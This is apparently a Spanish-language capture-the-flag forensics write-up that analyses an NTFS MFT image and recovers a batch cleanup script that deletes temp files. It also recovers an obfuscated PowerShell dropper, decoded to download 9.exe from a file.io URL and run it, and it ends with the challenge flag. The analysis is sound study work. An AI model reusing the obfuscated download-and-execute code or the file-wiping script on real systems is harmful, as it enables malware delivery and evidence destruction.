primero se descomprime
se obtiene mft.dd con  md5 hash "ea1708f82332010bb01c67d58ecedff1"
 

 se comenzo con binwalk-extract para encontrar informacion extraña, montando discoduro nada... 
 
 
```
$ file mft.dd
mft.dd: data
$ binwalk mft.dd

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
636239        0x9B54F         mcrypt 2.2 encrypted data, algorithm: blowfish-448, mode: CBC, keymode: 8bit
636375        0x9B5D7         mcrypt 2.2 encrypted data, algorithm: blowfish-448, mode: CBC, keymode: 8bit
637103        0x9B8AF         mcrypt 2.2 encrypted data, algorithm: blowfish-448, mode: CBC, keymode: 8bit
637215        0x9B91F         mcrypt 2.2 encrypted data, algorithm: blowfish-448, mode: CBC, keymode: 8bit

...

80117313      0x4C67E41       Copyright string: "copyright__, __email__, __license__, __summary__, __title__,"
80117521      0x4C67F11       Copyright string: "copyright__","
80141600      0x4C6DD20       Executable script, shebang: "/usr/bin/env python"
80141602      0x4C6DD22       Unix path: /usr/bin/env python

```
luego de la estructura de MFT
(http://www.cse.scu.edu/~tschwarz/coen252_07Fall/Lectures/NTFS.html) 

tenemos
```
$ xxd mft.dd | head

00000000: 4649 4c45 3000 0300 68b3 590e 0000 0000  FILE0...h.Y.....
00000010: 0100 0100 3800 0100 a801 0000 0004 0000  ....8...........
00000020: 0000 0000 0000 0000 0600 0000 0000 0000  ................
00000030: 4100 1e8d 0000 0000 1000 0000 6000 0000  A...........`...
00000040: 0000 1800 0000 0000 4800 0000 1800 0000  ........H.......
00000050: 902c 3f4c af0f d301 902c 3f4c af0f d301  .,?L.....,?L....
00000060: 902c 3f4c af0f d301 902c 3f4c af0f d301  .,?L.....,?L....
00000070: 0600 0000 0000 0000 0000 0000 0000 0000  ................
00000080: 0000 0000 0001 0000 0000 0000 0000 0000  ................
00000090: 0000 0000 0000 0000 3000 0000 6800 0000  ........0...h...

```
se ve algo extraño al normal, hay que parsearlo como binario , para ello se usa.
(https://volatility-labs.blogspot.mx/2013/05/movp-ii-24-reconstructing-master-file.html) 
 module (mtfparser) of volatility
  

	$ volatility -f mft.dd mftparser -N --output-file=mft.dd.vol.txt
	
	-f: for MFT file.
	-N: null time omit.
	--output-file: text file with detail analisys.

tiene las siguientes secciones:

Offset, Attribute, Record Number, Link count, $STANDARD\_INFORMATION, $FILE\_NAME, $DATA, $OBJECT\_ID

en general se ven lo normal, vlc, madiant tool, vbox tools, wireshark y otros:
 

	$FILE_NAME
	Creation                       Modified                       MFT Altered                    Access Date                    Name/Path
	------------------------------ ------------------------------ ------------------------------ ------------------------------ ---------
	2017-08-19 12:44:33 UTC+0000 2017-08-19 12:44:33 UTC+0000   2017-08-19 12:44:33 UTC+0000   2017-08-19 12:44:33 UTC+0000   Users\Marcus\Desktop\Mf.exe
	2017-08-21 16:41:24 UTC+0000 2017-08-21 16:41:24 UTC+0000   2017-08-21 16:41:24 UTC+0000   2017-08-21 16:41:24 UTC+0000   Users\Marcus\AppData\Local\Temp\9.exe

tiene  algo mas:

	$FILE_NAME
	Creation                       Modified                       MFT Altered                    Access Date                    Name/Path
	------------------------------ ------------------------------ ------------------------------ ------------------------------ ---------
	2017-08-21 16:38:33 UTC+0000 2017-08-21 16:38:33 UTC+0000   2017-08-21 16:38:33 UTC+0000   2017-08-21 16:38:33 UTC+0000   Users\Marcus\AppData\Local\Temp\TEMP4456~1.bat
al ver 

$DATA:


	$DATA
	0000000000: 40 65 63 68 6f 20 6f 66 66 0d 0a 63 64 20 25 74   @echo.off..cd.%t
	0000000010: 65 6d 70 25 0d 0a 72 65 6e 20 64 72 70 2e 70 73   emp%..ren.drp.ps
	0000000020: 31 20 32 33 2e 64 6d 70 0d 0a 66 6f 72 20 2f 64   1.23.dmp..for./d
	0000000030: 20 25 25 44 20 69 6e 20 28 2a 29 20 64 6f 20 72   .%%D.in.(*).do.r
	0000000040: 64 20 2f 73 20 2f 71 20 22 25 25 44 22 0d 0a 64   d./s./q."%%D"..d
	0000000050: 65 6c 20 2f 66 20 2f 71 20 2a                     el./f./q.*

se convierte de hex a bat

	$ xxd -r TEMP4456~1.bat.hex TEMP4456~1.bat.bin
	
se tiene el siguiente script 

```
$ more TEMP44~1.BAT.bin
@echo off
cd %temp%
ren drp.ps1 23.dmp
for /d %%D in (*) do rd /s /q "%%D"
del /f /q *
```
asi que ahora a buscar el 23.dmp
 
 
```
$FILE_NAME
Creation                       Modified                       MFT Altered                    Access Date                    Name/Path
------------------------------ ------------------------------ ------------------------------ ------------------------------ ---------
2017-08-21 16:39:37 UTC+0000 2017-08-21 16:39:37 UTC+0000   2017-08-21 16:39:37 UTC+0000   2017-08-21 16:39:37 UTC+0000   Users\Marcus\AppData\Local\Temp\23.dmp

su data 

$DATA
0000000000: 53 65 54 2d 56 61 52 49 61 62 6c 65 20 20 32 48   SeT-VaRIable..2H
0000000010: 79 34 51 55 20 20 28 20 22 20 20 29 20 29 34 33   y4QU..(."..).)43
0000000020: 5d 72 61 48 63 5b 2c 39 33 5d 72 61 48 63 5b 46   ]raHc[,93]raHc[F
0000000030: 2d 29 27 7d 31 7b 65 27 2b 27 78 65 27 2b 27 2e   -)'}1{e'+'xe'+'.
0000000040: 39 7d 31 7b 20 73 73 65 63 27 2b 27 6f 72 50 2d   9}1{.ssec'+'orP-
0000000050: 74 72 61 27 2b 27 74 53 3b 29 7d 30 7b 65 78 27   tra'+'tS;)}0{ex'
0000000060: 2b 27 65 2e 39 7d 27 2b 27 30 7b 2c 7d 30 7b 4f   +'e.9}'+'0{,}0{O
0000000070: 50 33 31 34 7a 27 2b 27 2f 27 2b 27 6f 69 2e 65   P314z'+'/'+'oi.e
0000000080: 6c 69 66 2f 2f 3a 73 70 74 74 68 7d 27 2b 27 30   lif//:sptth}'+'0
0000000090: 7b 28 27 2b 27 65 6c 27 2b 27 69 46 64 61 27 2b   {('+'el'+'iFda'+
00000000a0: 27 6f 6c 6e 77 6f 44 2e 27 2b 27 29 27 2b 27 74   'olnwoD.'+')'+'t
00000000b0: 6e 65 27 2b 27 69 6c 43 62 65 57 2e 74 27 2b 27   ne'+'ilCbeW.t'+'
00000000c0: 65 4e 2e 6d 65 74 73 79 53 20 74 63 65 6a 27 2b   eN.metsyS.tcej'+
00000000d0: 27 62 27 2b 27 4f 27 2b 27 2d 77 27 2b 27 65 27   'b'+'O'+'-w'+'e'
00000000e0: 2b 27 4e 28 27 28 03 00 28 20 29 27 27 4e 69 6f   +'N('(..(.)''Nio
00000000f0: 6a 2d 5d 32 2c 31 31 2c 33 5b 45 6d 61 6e 2e 29   j-]2,11,3[Eman.)
0000000100: 27 2a 52 44 6d 2a 27 20 76 47 28 28 2e 20 22 20   '*RDm*'.vG((..".
0000000110: 20 29 3b 20 20 5b 53 54 72 69 4e 47 5d 3a 3a 4a   .);..[STriNG]::J
0000000120: 4f 49 6e 28 20 27 27 2c 20 24 32 48 79 34 71 75   OIn(.'',.$2Hy4qu
0000000130: 5b 2d 20 31 20 2e 2e 20 2d 20 28 20 24 32 48 79   [-.1....-.(.$2Hy
0000000140: 34 71 75 2e 6c 65 6e 67 74 48 20 29 20 5d 29 7c   4qu.lengtH.).])|
0000000150: 20 26 20 28 20 24 65 4e 76 3a 70 75 42 4c 49 63   .&.(.$eNv:puBLIc
0000000160: 5b 31 33 5d 2b 24 65 6e 56 3a 50 55 42 6c 69 63   [13]+$enV:PUBlic
0000000170: 5b 35 5d 2b 27 78 27 29                           [5]+'x')
```
se ve ofuscado por reversestring o algo asi :

	SeT-VaRIable  2Hy4QU  ( "  ) )43]raHc[,93]raHc[F-)'}1{e'+'xe'+'.9}1{ ssec'+'orP-tra'+'tS;)}0{ex'+'e.9}'+'0{,}0{OP314z'+'/'+'oi.elif//:sptth}'+'0{('+'el'+'iFda'+'olnwoD.'+')'+'tne'+'ilCbeW.t'+'eN.metsyS tcej'+'b'+'O'+'-w'+'e'+'N('(;  [STriNG]::JOIn( '', $2Hy4qu[- 1 .. - ( $2Hy4qu.lengtH ) ])| & ( $eNv:puBLIc[13]+$enV:PUBlic[5]+'x')

si se ve el environment ''$env:public':

	.((Gv '*mDR*').namE[3,11,2]-joiN'') (('(N'+'e'+'w-'+'O'+'b'+'ject System.Ne'+'t.WebCli'+'ent'+')'+'.Downlo'+'adFi'+'le'+'({0'+'}https://file.io'+'/'+'z413PO{0},{0'+'}9.e'+'xe{0});St'+'art-Pro'+'cess {1}9.'+'ex'+'e{1}')-F[cHar]39,[cHar]34) )

se translada a esto:

	New Object System.Net.WebClient.DownloadFile(https://file.io/z413PO,9.exe)
	Start-Process 9.exe
	
	ahora tenemos la informacion, al ir al link, solo procesa hasta el PO,y ahi descarga el 9.exe  asi que queda asi:
	 

	$ printf "https://file.io/z413PO" | md5sum 
	a7f7183990dcd98fc91b99b7d79f8484
	
Flag --> **flag{a7f7183990dcd98fc91b99b7d79f8484}**